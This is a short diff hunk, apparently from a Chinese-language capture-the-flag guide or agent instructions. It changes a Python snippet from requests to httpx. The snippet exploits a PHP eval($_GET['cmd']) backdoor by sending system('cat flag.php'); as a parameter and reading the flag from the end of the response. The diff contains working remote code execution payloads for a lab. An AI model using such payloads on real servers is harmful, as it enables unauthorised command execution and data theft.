@@ -35,8 +35,8 @@ eval($_GET['cmd']);
 - 使用 `python_execute` 解析响应，只看最后几百字符
 
 ```python
-import requests
-r = requests.get(url, params={"cmd": "system('cat flag.php');"})
+import httpx
+r = httpx.get(url, params={"cmd": "system('cat flag.php');"})
 # flag 在 r.text 的末尾，不在源码高亮部分
 print(r.text[-500:])  # 只看最后 500 字符
 ```
